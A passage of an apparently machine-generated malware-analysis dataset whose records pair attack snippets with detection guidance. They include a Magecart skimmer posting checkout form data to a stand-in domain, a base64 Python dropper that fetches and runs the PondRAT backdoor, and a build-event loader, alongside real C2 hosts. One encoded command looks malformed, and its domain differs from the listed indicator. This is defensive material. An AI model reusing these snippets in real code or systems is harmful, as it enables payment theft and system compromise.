Unusual API calls to Facebook ad endpoints (e.g., /act_{ad_account_id}/campaigns) from apps that are not official ad management tools
detection_knowledge.how_to_detect: Monitor Android apps for custom implementations of Facebook login that request credentials directly and transmit them to non-Facebook domains. Flag apps that make outbound HTTP/HTTPS POST requests containing credential data to unknown or suspicious domains during authentication. Analyze app code for hardcoded exfiltration URLs, custom login forms, and references to Facebook ad management APIs in non-advertising apps. Correlate network activity with app behavior to identify unauthorized ad campaign creation using stolen tokens.

package_info.why_malicious: The Magecart skimmer is malicious because it is injected into e-commerce websites to surreptitiously steal customers’ personal and financial information by intercepting and exfiltrating payment data during the checkout process, resulting in large-scale theft of credit card and identity data.

execution_context.trigger: At runtime, when a user submits the payment form on the checkout page
execution_context.file_location: Injected JavaScript within the HTML source of the checkout/payment page
required_permissions: Access to the DOM to read form fields
Ability to initiate outbound network requests (fetch/XHR)

malicious_snippets.code_snippet: document.querySelector('form').addEventListener('submit', function(e) { var data = new FormData(this); fetch('https://malicious-domain.com/collect', { method: 'POST', body: data }); });
malicious_snippets.code_behavior: At runtime, when the user submits the payment form, the code attaches an event listener to the form submission event, collects all form data (including payment and personal details), and sends this data via an HTTPS POST request to a hardcoded external domain controlled by the attacker, resulting in exfiltration of sensitive information.

malice_analysis.why_suspicious: The code intercepts sensitive payment form submissions and exfiltrates the entire form data to an untrusted, attacker-controlled domain, which is a hallmark of web skimming attacks.
malice_analysis.violated_expectations: Legitimate e-commerce JavaScript should only transmit payment data to trusted, whitelisted payment processors or merchant servers, never to unknown or untrusted third-party domains.
malice_analysis.similar_legitimate_use: Legitimate scripts may send form data to payment gateways or fraud detection services, but only to domains that are explicitly trusted and verified by the merchant.
key_indicators: Event listener attached to payment form submission
Use of FormData to capture all user input fields
Outbound fetch/XHR POST request to a hardcoded, untrusted external domain
No user notification or consent for data transmission
Domain used for exfiltration is not associated with the merchant or payment processor

attack_chain.action: Attacker injects malicious JavaScript into the checkout page of the e-commerce site, either by compromising the site directly or via a third-party dependency.
attack_chain.leads_to: Malicious code is loaded and executed in the browsers of customers during the checkout process.

attack_chain.action: The injected JavaScript attaches an event listener to the payment form, intercepts the form submission, collects all entered data, and sends it to an attacker-controlled server.
attack_chain.leads_to: Attacker receives stolen payment and personal data in real time, enabling credit card theft and potential identity fraud.

behavioral_signatures: JavaScript code intercepting form submissions specifically on checkout or payment pages
Outbound network requests (fetch/XHR) from payment pages to domains not associated with the merchant or known payment processors
Unexpected collection and transmission of full form data, including payment and PII fields, to external destinations
file_indicators: Presence of injected or obfuscated JavaScript within the HTML source of checkout or payment pages
References to external scripts or resources loaded from non-whitelisted or newly registered domains in payment page HTML
network_indicators: HTTPS POST requests originating from checkout or payment pages to domains not owned by the merchant or payment processor
Outbound traffic to domains known for skimming activity or recently registered domains with no prior association to the merchant
Unusual spikes in POST requests containing form-encoded or multipart data during checkout events
detection_knowledge.how_to_detect: Continuously monitor e-commerce checkout and payment pages for unauthorized or injected JavaScript, especially code that attaches event listeners to form submissions and sends data to external domains. Implement network monitoring to detect outbound POST requests containing payment or PII data to untrusted or non-whitelisted destinations. Regularly scan and compare site code against known-good baselines to identify unauthorized changes. Flag any references to external scripts from unknown domains and investigate any new or unrecognized domains receiving data from checkout pages.

package_info.why_malicious: The package intentionally misrepresents its metadata on the npm registry website by omitting actual dependencies, license, and install scripts from the public registry metadata. This concealment allows attackers to hide malicious or vulnerable dependencies and postinstall scripts from users and security tools that rely on registry metadata, enabling supply chain attacks through hidden code execution and dependency smuggling.

execution_context.file_location: package.json (bundled inside tarball, not reflected on npmjs.com)

malicious_snippets.code_snippet: "scripts": { "install": "node ./install.js" }
malicious_snippets.code_behavior: At postinstall, the code executes the install.js script using Node.js, which can perform arbitrary actions on the filesystem and network, resulting in potential code execution, data exfiltration, or system modification.

malice_analysis.why_suspicious: The install script is present in the bundled package.json but is not disclosed in the npm registry metadata, enabling hidden execution of arbitrary code during installation without user awareness.
malice_analysis.violated_expectations: Normal packages declare install scripts transparently in the manifest shown on npmjs.com, allowing users and security tools to review them. Here, the install script is hidden from the registry metadata, violating expectations of transparency and trust.
malice_analysis.similar_legitimate_use: Some legitimate packages use install scripts for setup or compilation, but these are typically declared transparently in the registry metadata for user review.
key_indicators: Install script present in bundled package.json but absent from registry metadata
Ability to execute arbitrary code at install time via install.js
Mismatch between public manifest and actual package contents regarding scripts

malicious_snippets.code_snippet: "dependencies": { "sleepover": "^1.0.0" }
malicious_snippets.code_behavior: At install-time, the code causes npm to fetch and install the 'sleepover' dependency from the npm registry, introducing additional code into the environment without this dependency being visible in the public registry metadata, resulting in hidden dependency installation.

malice_analysis.why_suspicious: The dependency is hidden from the registry metadata and only present in the bundled package.json, allowing attackers to smuggle in malicious or vulnerable code without user or tool awareness.
malice_analysis.violated_expectations: Users and security tools expect the dependency list on npmjs.com to match the actual installed dependencies. Concealing dependencies in the bundled manifest violates this expectation and undermines supply chain transparency.
malice_analysis.similar_legitimate_use: Legitimate packages declare all dependencies transparently in the registry metadata; hiding them in the bundled manifest is not standard practice and is a red flag.
key_indicators: Hidden dependency in bundled package.json not present in registry metadata
Discrepancy between registry metadata and actual dependency list
Potential for dependency confusion or smuggling attacks via concealed dependencies

malicious_snippets.code_snippet: "name": "express", "version": "3.0.0", "license": "ISC"
malicious_snippets.code_behavior: At import-time or during metadata inspection, the code presents a manifest that claims the package is 'express' version 3.0.0 with an ISC license, misrepresenting the package's identity, version, and license compared to the npm registry, resulting in user and tool deception.

malice_analysis.why_suspicious: The manifest claims to be a different package ('express', version 3.0.0, ISC license) than what is published, which can be used for impersonation, license confusion, or version downgrade attacks, misleading users and automated tools.
malice_analysis.violated_expectations: Users and security tools expect the registry metadata to match the actual package contents. Here, the manifest is intentionally misleading, violating trust and enabling potential impersonation or legal confusion.
malice_analysis.similar_legitimate_use: Forks or copies may accidentally retain old metadata, but intentional misrepresentation of name, version, or license is a strong indicator of malicious intent.
key_indicators: Manifest claims different name/version/license than registry metadata
Potential for impersonation or license confusion via false metadata
Mismatch between public and bundled manifest fields

attack_chain.action: User or tool inspects npm registry metadata and sees no dependencies, no install script, and no license.
attack_chain.leads_to: User trusts the package and installs it.

attack_chain.action: During installation, the actual bundled package.json is used, which pulls in the hidden 'sleepover' dependency.
attack_chain.leads_to: Additional code (potentially malicious) is installed without user awareness.

attack_chain.action: The install script (install.js) is executed, allowing arbitrary code execution on the user's system.
attack_chain.leads_to: Potential system compromise, data exfiltration, or further attack steps.

behavioral_signatures: Discrepancy between npm registry metadata and bundled package.json fields (name, version, license, dependencies, scripts)
Presence of install scripts in bundled manifest not declared in registry metadata
Hidden dependencies present only in bundled package.json
Manifest claims different name/version/license than registry metadata
file_indicators: package.json in tarball differs from registry metadata
Presence of install scripts (e.g., 'install' or 'postinstall') in bundled package.json
Unexpected dependencies (e.g., 'sleepover') in bundled package.json not listed in registry metadata
network_indicators: Unexpected network requests during install (if install.js performs network operations)
Fetching dependencies (e.g., 'sleepover') not listed in registry metadata
detection_knowledge.how_to_detect: Scan the actual contents of the package tarball, not just the registry metadata. Compare the bundled package.json to the metadata shown on npmjs.com. Flag any discrepancies in dependencies, scripts, name, version, or license. Monitor for install scripts or dependencies present in the tarball but not in the registry. Alert on packages where the install process pulls in unexpected dependencies or executes hidden scripts. Correlate install-time network activity with the presence of hidden install scripts or dependencies.

package_info.why_malicious: These packages contain malicious code that, upon installation or import, executes obfuscated bash commands to download, install, and execute the PondRAT backdoor. This enables remote access and control of the victim system, including file upload/download, arbitrary command execution, and persistence, representing a clear supply chain attack risk to any system where the package is installed.

malicious_snippets.code_snippet:
import os
import base64
os.system(base64.b64decode('ZWNobyAnZG93bmxvYWRpbmcgUE9ORFJBVC4uLic7IGN1cmwgLXMgL2Jpbi9iYXNoIC1vIC1sIC1LIGh0dHBzOi8vZXZpbC5kb21haW4vUG9uZFJBVCAtbyAvdG1wL1BvbmRSQVQ7IGNoYW1vZCArYyAnY2htb2QgK3ggL3RtcC9Qb25kUkFUIjsgL3RtcC9Qb25kUkFUIA=='))
malicious_snippets.code_behavior: At import-time, the code decodes a base64-encoded shell command, downloads the PondRAT binary from a remote server using curl, writes it to /tmp/PondRAT, changes its permissions to make it executable, and then executes it, resulting in the installation and launch of the backdoor.

malice_analysis.why_suspicious: The use of base64 decoding to conceal a shell command that downloads and executes a remote binary is a hallmark of malware delivery and evasion. The code executes automatically upon import, without user consent, and targets a suspicious remote domain.
malice_analysis.violated_expectations: Legitimate Python packages should not execute hidden or obfuscated shell commands, nor should they download and run external binaries during import or installation. Such behavior is a clear violation of software supply chain security norms.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or perform setup tasks, but they do so transparently, without obfuscation, and never by executing arbitrary shell commands or fetching unverified binaries from untrusted sources.
key_indicators: base64-encoded shell command embedded in Python code
os.system call with decoded payload
curl used to download external binary
writes executable to /tmp/PondRAT
chmod to set executable permissions
automatic execution of downloaded binary

execution_context.file_location: PondRAT binary (downloaded and executed by snippet_1)

malicious_snippets.code_snippet: PondRAT supports commands: upload, download, sleep, exec (execute arbitrary shell commands), check (implant status)
malicious_snippets.code_behavior: At runtime, after execution of the downloaded binary, the RAT establishes a connection to its C2 server, receives commands such as upload, download, sleep, exec, and check, and performs file transfers, arbitrary shell command execution, and status reporting, enabling full remote control of the infected system.

malice_analysis.why_suspicious: Remote access tools that provide arbitrary command execution, file transfer, and persistent C2 communication are classic indicators of backdoor malware. The presence of these capabilities in a hidden payload delivered via a Python package is highly suspicious.
malice_analysis.violated_expectations: A legitimate package should never provide remote shell access, file transfer, or C2 communication capabilities to an external server, especially not as a hidden or secondary payload.
malice_analysis.similar_legitimate_use: Remote administration tools may offer similar features in enterprise environments, but never as a concealed component within a public PyPI package or without explicit user consent and transparency.
key_indicators: C2 command handler supporting upload/download/exec/sleep/check
arbitrary shell command execution via remote instructions
file transfer functionality (upload/download) to/from attacker
persistent network connection to C2 server
status beaconing to confirm implant activity

attack_chain.action: User installs or imports the malicious PyPI package.
attack_chain.leads_to: Malicious code execution at import-time.

attack_chain.action: Malicious code decodes and executes a shell command to download and run the PondRAT backdoor.
attack_chain.leads_to: PondRAT backdoor is installed and running on the victim system.

attack_chain.action: PondRAT establishes communication with its C2 server and awaits commands.
attack_chain.leads_to: Attacker gains remote access and control over the victim system.

attack_chain.action: Attacker uses PondRAT to upload/download files, execute commands, and maintain persistence.
attack_chain.leads_to: Potential data exfiltration, lateral movement, or further compromise.

behavioral_signatures: Base64-decoded shell commands executed at import-time in Python package code
os.system or subprocess calls with obfuscated or decoded payloads during package import
Download and execution of remote binaries (e.g., via curl) from within __init__.py or main module
Unexpected network connections initiated by Python processes immediately after package installation or import
Creation and execution of new files in /tmp or other writable directories by Python code
file_indicators: /tmp/PondRAT
base64-encoded payloads present in __init__.py or main module
Unexpected executable files created in /tmp or user directories by Python processes
network_indicators: Outbound HTTP/HTTPS requests to suspicious or non-standard domains (e.g., evildo.main/PondRAT)
C2 communication patterns typical of RATs, such as periodic beaconing and command retrieval from remote servers
detection_knowledge.how_to_detect: Monitor for Python packages that execute shell commands or download binaries during installation or import, especially those using base64 decoding followed by os.system or subprocess calls. Flag the creation and execution of new files in /tmp or other writable directories by Python processes. Detect outbound network connections from Python processes to untrusted or suspicious domains, particularly immediately after package installation or import. Scan for base64-encoded payloads in package source files, and alert on the presence of known file indicators such as /tmp/PondRAT.

package_info.why_malicious: The report is a high-level threat landscape analysis and does not describe any specific malicious software package or code. It discusses trends such as the convergence of APT and cybercrime tactics, the rise of wiper malware, and the increasing sophistication and stealth of attacks, but does not analyze or attribute malicious code to any particular package.

behavioral_signatures: Deployment of wiper malware that irreversibly destroys data on targeted systems.
Use of advanced defense evasion techniques to bypass security controls and remain undetected.
Execution of targeted ransomware playbooks, including data encryption and extortion tactics.
Conducting reconnaissance and weaponization of emerging technologies to facilitate attacks.
file_indicators: No specific file indicators provided in the report.
network_indicators: No specific network indicators provided in the report.
detection_knowledge.how_to_detect: Detection should focus on behavioral analysis, such as monitoring for destructive actions like mass file deletion or overwriting, stealthy command execution patterns, and unusual reconnaissance activity. Employ real-time threat intelligence, endpoint detection and response (EDR), inline sandboxing, and digital risk protection services to identify and mitigate evolving threats. As the report does not provide specific IOCs or code-based detection patterns, detection strategies should emphasize anomaly-based monitoring and rapid response to observed malicious behaviors.

package_info.why_malicious: The affected versions of Apache Struts contain a critical vulnerability (CVE-2023-50164) that allows attackers to manipulate file upload parameters, enabling path traversal and, under certain circumstances, the upload of malicious files (such as a WAR webshell). This can lead to remote code execution on the server, making the package as shipped in these versions dangerous and exploitable.

execution_context.trigger: At runtime, when a file upload request is processed by the application.
execution_context.file_location: Struts web application file upload handler (Java controller/action responsible for processing uploads).
required_permissions: filesystem write access to the server's file system
network access (if the uploaded file is later used for remote access or exfiltration)

malicious_snippets.code_behavior: At runtime, the file upload handler accepts user-supplied file path parameters, directly constructs a file path using this input, and writes the uploaded file to the resulting location, enabling attackers to perform path traversal and place arbitrary files (such as a WAR webshell) on the server, which can result in remote code execution.

malice_analysis.why_suspicious: The code directly uses user-supplied input to determine the file system path for uploaded files without any validation or sanitization, allowing attackers to traverse directories and write files outside the intended upload directory.
malice_analysis.violated_expectations: Normal file upload handlers should strictly validate and sanitize both file names and destination paths, ensuring that uploads are only written to safe, predetermined directories. This code fails to enforce such controls, enabling arbitrary file placement.
malice_analysis.similar_legitimate_use: Legitimate file upload features may allow users to upload files, but should never allow user control over the destination path or permit directory traversal sequences.
key_indicators: Absence of path sanitization or validation on user-supplied input
Direct concatenation of user input into file system paths
Ability to write files to arbitrary locations, including application server deployment directories
Presence of directory traversal sequences (e.g., '../') in upload parameters

execution_context.trigger: At runtime, after a malicious file (such as a WAR webshell) has been uploaded and deployed by the application server.
execution_context.file_location: Deployed webshell (uploaded WAR file containing a JSP file in the Tomcat webapps directory).
required_permissions: filesystem write access (to deploy the webshell)
network access (to receive attacker commands and exfiltrate data)
process execution (to run system commands via the webshell)

malicious_snippets.code_behavior: At runtime, after the attacker uploads and deploys a malicious WAR file, the webshell receives HTTP requests containing a 'cmd' parameter, executes the specified system command on the server, and returns the command output in the HTTP response, resulting in remote code execution and full server compromise.

malice_analysis.why_suspicious: The webshell executes arbitrary system commands received via HTTP parameters and returns their output, providing attackers with persistent remote access and control over the server.
malice_analysis.violated_expectations: Normal web applications should never allow execution of system commands based on user input. This behavior is only present in malicious implants or backdoors.
malice_analysis.similar_legitimate_use: There is no legitimate use for this pattern in production web applications; command execution from HTTP parameters is a hallmark of webshells.
key_indicators: Use of Runtime.getRuntime().exec() or similar APIs with user-supplied input
Returning system command output directly in HTTP responses
Presence of webshell code in newly uploaded or modified files
HTTP endpoints that accept and execute arbitrary commands via parameters (e.g., 'cmd=')

attack_chain.action: Attacker crafts a file upload request with a manipulated upload path parameter containing directory traversal sequences to perform path traversal.
attack_chain.leads_to: Malicious file (such as a WAR webshell) is written to a location (e.g., Tomcat webapps directory) where it will be automatically deployed and executed by the application server.

attack_chain.action: Attacker accesses the uploaded webshell via HTTP and sends commands to be executed on the server through the webshell interface.
attack_chain.leads_to: Remote code execution and full compromise of the server, allowing the attacker to execute arbitrary commands and maintain persistent access.

behavioral_signatures: File uploads resulting in files being written outside the intended upload directory, especially into application server deployment paths (e.g., Tomcat webapps).
Unexpected deployment of new .war or .jsp files in Tomcat webapps directory following file upload activity.
HTTP requests to newly uploaded files with suspicious parameters (e.g., ?cmd=) that trigger command execution.
Execution of system commands via web application endpoints, observable through process creation logs or command output in HTTP responses.
file_indicators: Unexpected .war or .jsp files appearing in Tomcat webapps directory, especially shortly after file uploads.
File names or paths containing directory traversal sequences (../) in upload requests or resulting file system changes.
Presence of webshell code patterns (e.g., Runtime.getRuntime().exec in JSP files) in newly created or modified files.
network_indicators: Inbound HTTP requests to newly deployed files with suspicious parameters (e.g., ?cmd=) indicating webshell interaction.
Outbound connections initiated by the application server to external or attacker-controlled hosts, potentially for command and control or data exfiltration.
detection_knowledge.how_to_detect: Monitor file upload endpoints for path traversal attempts by inspecting upload parameters for directory traversal sequences and ensuring uploaded files are only written to authorized directories. Audit the Tomcat webapps directory for unexpected .war or .jsp files, especially those created shortly after file uploads. Inspect HTTP access logs for requests to new files with command execution parameters (e.g., ?cmd=). Use file integrity monitoring to detect unauthorized file creation or modification. Alert on the use of Runtime.getRuntime().exec() or similar APIs in uploaded or recently modified files. Correlate file upload events with subsequent deployment of executable files and suspicious HTTP activity to identify exploitation attempts.

package_info.package_versions: N/A (malicious code present in latest/main branches as of April 2024)
package_info.why_malicious: These repositories are intentionally crafted to distribute malware by embedding heavily obfuscated, auto-executing payloads within Visual Studio project files. The attackers use social engineering tactics such as fake stars, frequent trivial commits, and misleading repository descriptions to boost search ranking and lure victims. Upon building the project, the code establishes persistence, downloads and executes further payloads, and specifically targets cryptocurrency wallets and sensitive user data.

execution_context.trigger: build-time (when the project is built in Visual Studio)
execution_context.file_location: Visual Studio project file (.vcxproj or .csproj), within the <PreBuildEvent> or <Command> element
required_permissions: filesystem (to write temporary scripts and files)

malicious_snippets.code_snippet:
<Command>echo off
setlocal
set "base64Data=ZnV..." ... (very long base64-encoded string) ...</Command>
malicious_snippets.code_language: Batch script (with embedded VBScript and PowerShell)
malicious_snippets.code_behavior: At build-time, the code executes a batch script that writes a VBScript file to disk, decodes a base64-encoded PowerShell payload, and executes it, resulting in the launch of a multi-stage malware infection process.

malice_analysis.why_suspicious: Embedding obfuscated, auto-executing scripts in Visual Studio project files is a well-known malware technique to ensure code execution without user awareness. The use of multi-stage scripting (batch → VBScript → PowerShell) and base64 encoding is designed to evade static analysis and detection.
malice_analysis.violated_expectations: Legitimate .vcxproj/.csproj files may use build events for automation, but do not contain obfuscated, multi-stage scripts or code that initiates network connections or executes further payloads.
malice_analysis.similar_legitimate_use: Custom build steps may invoke code generators or formatters, but not hidden, obfuscated scripts that chain multiple interpreters or download remote code.
key_indicators: Obfuscated base64-encoded payload embedded in project file
Automatic execution of scripts via build events
Multi-stage script chain (batch script writes VBScript, which launches PowerShell)
Presence of suspicious <PreBuildEvent> or <Command> elements in project files

execution_context.trigger: runtime (immediately after PowerShell script execution during build process)
execution_context.file_location: Decoded PowerShell script (written to disk and executed from the build process)
required_permissions: network (to retrieve external payloads and check geolocation)
filesystem (to write and extract downloaded files)

malicious_snippets.code_snippet: PowerShell: Retrieves victim's country code via external IP lookup, downloads encrypted payloads from attacker-controlled URLs (e.g., cdn.discordapp[.]com/attachments/*/VisualStudioEN.7z), extracts payloads using a hardcoded password, executes the resulting files, and establishes persistence via scheduled task creation.
malicious_snippets.code_behavior: At runtime, the PowerShell script determines the victim's country by querying an external geolocation service, conditionally downloads encrypted payloads from attacker-controlled URLs, extracts and executes the payloads, and creates a scheduled task to maintain persistence.

malice_analysis.why_suspicious: The script performs network-based payload retrieval, country-aware targeting to avoid certain regions, and establishes persistence—all hallmarks of advanced malware. The use of encrypted payloads and hardcoded extraction passwords further indicates intent to evade detection.
malice_analysis.violated_expectations: Legitimate PowerShell scripts in build processes do not download and execute remote payloads, perform geolocation checks, or create persistence mechanisms such as scheduled tasks.
malice_analysis.similar_legitimate_use: Automated update scripts may download files, but not in an obfuscated, country-targeted, or persistence-establishing manner, nor do they typically execute downloaded binaries without user consent.
key_indicators: Country code check via external IP geolocation service
Download of encrypted payloads from non-standard URLs (e.g., cdn.discordapp[.]com/attachments/*/VisualStudioEN.7z)
Extraction of payloads using hardcoded passwords
Creation of scheduled tasks for persistence

execution_context.trigger: runtime (after payload extraction and execution by PowerShell script)
execution_context.file_location: Extracted executable (e.g., feedbackAPI.exe) written to disk by the PowerShell script
required_permissions: filesystem (to create shortcuts and write files)
process_execution (to run itself and maintain persistence)
persistence (to create scheduled tasks and shortcuts)

malicious_snippets.code_snippet: Executable (feedbackAPI.exe) artificially padded to 750MB, creates a shortcut and a scheduled task named 'Feedback_API_VS_Services_Client' to run daily at 4AM, ensuring persistent execution.
malicious_snippets.code_behavior: At runtime, the executable creates a shortcut and a scheduled task named 'Feedback_API_VS_Services_Client' to run itself daily at 4AM, using artificial file size padding to evade antivirus detection and maintain persistence on the victim's machine.

malice_analysis.why_suspicious: Artificially padding executables to abnormally large sizes is a known anti-forensic and anti-virus evasion technique. The silent creation of scheduled tasks with non-standard names further indicates stealthy persistence mechanisms.
malice_analysis.violated_expectations: Legitimate software does not pad binaries to evade detection or create scheduled tasks and shortcuts without explicit user consent or clear documentation.
malice_analysis.similar_legitimate_use: Some legitimate updaters use scheduled tasks, but not with stealth, artificial file size inflation, or misleading task names.
key_indicators: Executable file size padded to 750MB or larger
Silent creation of scheduled task 'Feedback_API_VS_Services_Client'
Creation of shortcuts to maintain persistence
Unusual or misleading task and file names

attack_chain.action: Attacker creates and manipulates GitHub repositories to appear popular and recently updated, using fake stars and frequent trivial commits to increase visibility.
attack_chain.leads_to: Victim discovers and downloads the repository, believing it to be legitimate.

attack_chain.action: Victim builds the project in Visual Studio, triggering the obfuscated batch script embedded in the project file.
attack_chain.leads_to: PowerShell payload is decoded, written to disk, and executed.

attack_chain.action: PowerShell script checks the victim's country via IP geolocation, downloads encrypted payloads from attacker-controlled URLs, extracts and executes them, and establishes persistence.
attack_chain.leads_to: Malicious executable is extracted and run on the victim's machine.

attack_chain.action: Malicious executable (e.g., feedbackAPI.exe) establishes persistence by creating a shortcut and a scheduled task to run daily at 4AM.
attack_chain.leads_to: Malware remains active on the system and can perform further actions, such as cryptocurrency wallet theft or data exfiltration.

behavioral_signatures: Obfuscated or base64-encoded scripts embedded in Visual Studio project files (<PreBuildEvent> or <Command> elements)
Automatic execution of multi-stage scripts (batch → VBScript → PowerShell) during build events
PowerShell scripts that perform country code checks via external IP geolocation services
Download and extraction of encrypted payloads from non-standard URLs (e.g., cdn.discordapp[.]com/attachments/*/VisualStudioEN.7z)
Creation of scheduled tasks with unusual or misleading names for persistence
Executables padded to abnormally large sizes (e.g., 750MB) to evade antivirus detection
file_indicators: *.csproj or *.vcxproj files containing <PreBuildEvent> or <Command> elements with obfuscated or base64-encoded scripts
Temporary files created during build process (e.g., .vbs, .ps1 scripts in project directory or temp folders)
Extracted executables named feedbackAPI.exe or similar, with unusually large file sizes
Scheduled task named 'Feedback_API_VS_Services_Client' created without user interaction
Shortcuts created in startup folders pointing to feedbackAPI.exe or related payloads
network_indicators: Connections to cdn.discordapp[.]com/attachments/*/VisualStudioEN.7z
Connections to rentry[.]co, paste[.]fo, textbin[.]net for payload staging or command retrieval
Connections to ooocyber[.]keenetic[.]pro, 188[.]113[.]132[.]109 for payload download or C2 communication
Outbound HTTP(S) requests to IP geolocation services for country code checks
detection_knowledge.how_to_detect: Scan Visual Studio project files for obfuscated or base64-encoded scripts within <PreBuildEvent> or <Command> elements. Monitor build processes for unexpected execution of batch, VBScript, or PowerShell scripts, especially those that initiate network connections or write new files. Flag the creation of scheduled tasks with suspicious or non-standard names, and alert on executables with excessive padding or abnormal file sizes (e.g., >500MB). Correlate repository activity (frequent trivial commits, sudden spikes in stars) with code review findings to identify social engineering campaigns. Monitor for network connections to known attacker infrastructure and payload hosting domains.

package_info.package_manager: N/A (custom exploit tool, not a package manager)
package_info.package_versions: Affects all supported Windows versions (Windows 10/11, fully patched as of 2024-10)
package_info.why_malicious: The tool enables attackers to downgrade critical Windows system components (such as ci.dll, drivers, and kernel modules) to older, vulnerable versions by bypassing Windows file protection and update mechanisms. This reintroduces patched vulnerabilities, allows unsigned or malicious kernel drivers to be loaded, disables security features, and facilitates further malicious activity while evading detection and maintaining persistence.

execution_context.file_location: ci.dll (Windows Code Integrity module), other system DLLs/drivers

malicious_snippets.code_snippet: Downdate tool logic: Overwrite patched system DLL (e.g., ci.dll) with an older, vulnerable version, bypassing Windows file protection and update mechanisms.
malicious_snippets.code_behavior: At runtime, the tool overwrites a patched system DLL (such as ci.dll) with an older, vulnerable version by bypassing Windows file protection and update mechanisms, resulting in the reintroduction of previously patched vulnerabilities and the circumvention of digital signature enforcement.

malice_analysis.why_suspicious: Overwriting protected system files with outdated, vulnerable versions is a well-known privilege escalation and persistence technique that directly undermines the integrity of the operating system.
malice_analysis.violated_expectations: Normal system operation expects system DLLs to be immutable and only updated through trusted Windows Update mechanisms. Downgrading to vulnerable versions outside of these channels is never legitimate and breaks the security model.
malice_analysis.similar_legitimate_use: Legitimate system recovery or rollback tools may restore previous versions, but only with explicit user or administrator consent, proper logging, and through official recovery workflows.
key_indicators: Direct replacement of system DLLs (e.g., ci.dll) with older versions outside of Windows Update
Bypassing Windows file protection and digital signature enforcement mechanisms
Presence of system files with known-vulnerable hashes or timestamps inconsistent with expected baselines

malicious_snippets.code_snippet: Exploit logic: Trigger page faults to force Windows to reload and allow modification of files marked as immutable, exploiting 'False File Immutability' (ItsNotASecurityBoundary).
malicious_snippets.code_behavior: At runtime, the exploit triggers page faults in the kernel to force Windows to reload protected files and exploit the 'False File Immutability' flaw, allowing modification of files that should be immutable, which enables further exploitation and persistence.

malice_analysis.why_suspicious: Bypassing file immutability to modify protected system files is a direct exploitation of a security boundary and is indicative of malicious intent to subvert OS protections.
malice_analysis.violated_expectations: Protected system files are expected to be locked and unmodifiable after being secured by the OS. Exploiting page fault handling to alter them is highly abnormal and not permitted in legitimate workflows.
malice_analysis.similar_legitimate_use: There is no legitimate use for exploiting page faults to modify protected files; this technique is exclusively used for malicious purposes.
key_indicators: Triggering page faults in the kernel to modify protected files
Modifying files with write access explicitly denied by the OS
Targeting system files that have been patched for known vulnerabilities

malicious_snippets.code_snippet: Load unsigned kernel driver: Use the downgraded, vulnerable ci.dll to load an unsigned or malicious kernel driver.
malicious_snippets.code_behavior: At runtime, after downgrading ci.dll, the attacker loads an unsigned or malicious kernel driver by exploiting the vulnerable code integrity checks, bypassing digital signature enforcement and enabling arbitrary code execution in kernel mode.

malice_analysis.why_suspicious: Loading unsigned drivers on a fully patched system is a major red flag, as it bypasses core Windows security controls and enables attackers to execute arbitrary code with kernel privileges.
malice_analysis.violated_expectations: Windows is designed to only allow signed drivers to be loaded, especially on systems with Secure Boot and Driver Signature Enforcement (DSE) enabled. Loading unsigned drivers after a suspicious DLL downgrade is never legitimate.
malice_analysis.similar_legitimate_use: Legitimate driver development or testing may require test signing, but this is only done on non-production systems with explicit configuration and is never performed on production endpoints without proper controls.
key_indicators: Loading of unsigned or test-signed drivers on systems with Secure Boot and DSE enabled
Driver loads occurring immediately after suspicious DLL downgrades
Kernel-level code execution without valid digital signatures

attack_chain.action: Attacker gains administrative or SYSTEM-level access to the target Windows system.
attack_chain.leads_to: Ability to execute custom tools and modify system files

attack_chain.action: Attacker uses the Downdate tool to overwrite patched system DLLs (e.g., ci.dll) with older, vulnerable versions.
attack_chain.leads_to: System is now running with known-vulnerable components

attack_chain.action: Attacker exploits 'False File Immutability' by triggering page faults to modify protected files, bypassing write restrictions.
attack_chain.leads_to: Further modification of system files and persistence

attack_chain.action: Attacker loads unsigned or malicious kernel drivers using the downgraded ci.dll, bypassing digital signature enforcement.
attack_chain.leads_to: Full kernel-level code execution, disabling security features, deploying rootkits, etc.

attack_chain.action: Attacker disables security features, deploys and disguises malicious code and processes, and maintains persistence.
attack_chain.leads_to: Final goal: complete system compromise and evasion of detection

behavioral_signatures: Unexplained downgrades of system DLLs or drivers to older, vulnerable versions outside of Windows Update
Modification of protected system files (such as ci.dll) without use of official update mechanisms
Loading of unsigned or test-signed kernel drivers on Secure Boot-enabled systems
Unusual page fault activity correlated with modifications to protected system files
file_indicators: ci.dll or other core system DLLs replaced with older, known-vulnerable versions
Timestamps or cryptographic hashes of system files not matching expected values from official baselines
Presence of custom tools or scripts capable of DLL/driver replacement in system directories
network_indicators: Outbound connections for downloading old or vulnerable DLLs or drivers from non-Microsoft sources
Potential command-and-control (C2) traffic if malicious drivers establish persistence or exfiltrate data
detection_knowledge.how_to_detect: Continuously monitor for changes to system DLLs and drivers, especially downgrades to known-vulnerable versions. Alert on any modification of protected files outside of Windows Update or official recovery workflows. Detect and alert on attempts to load unsigned or test-signed drivers on systems with Secure Boot or Driver Signature Enforcement enabled. Correlate abnormal page fault activity with file modifications on protected system files. Employ file integrity monitoring and maintain a baseline of expected system file versions and hashes to detect unauthorized changes.

package_info.package_versions: Windows and MacOS builds affected in March-April 2023
package_info.why_malicious: The 3CXDesktopApp was compromised in a supply chain attack, resulting in the delivery of multiple malware payloads (TAXHAUL/TxRLoader, COLDCAT, SIMPLESEA) that enabled unauthorized code execution, persistence, and remote command-and-control, all without user consent. The attack leveraged DLL side-loading, in-memory shellcode execution, and installation of backdoors, impacting both Windows and MacOS platforms.

malicious_snippets.code_snippet: TAXHAUL (TxRLoader) decrypts and executes shellcode from <machine hardware profile GUID>.TxR.0.regtrans-ms
malicious_snippets.code_behavior: At runtime (post-installation, on application launch), the TAXHAUL loader reads an encrypted payload from C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms, decrypts the shellcode in memory, and executes it, resulting in the in-memory launch of a downloader (COLDCAT) that can fetch additional payloads.

malice_analysis.why_suspicious: Decrypting and executing shellcode from a hidden file in a system directory is highly anomalous and indicative of malicious intent, as legitimate applications do not perform such actions.
malice_analysis.violated_expectations: Normal software should not execute code from files in the TxR directory, nor should it decrypt and run arbitrary shellcode at runtime from obscure system locations.
malice_analysis.similar_legitimate_use: Some security or update tools may use encrypted payloads for self-updating, but they do not use the TxR directory or execute arbitrary shellcode in this manner.
key_indicators: Decryption and execution of shellcode from a non-standard file location (TxR directory)
Use of system directories to conceal payloads
In-memory execution to evade disk-based detection
Access to and modification of files in C:\Windows\System32\config\TxR\

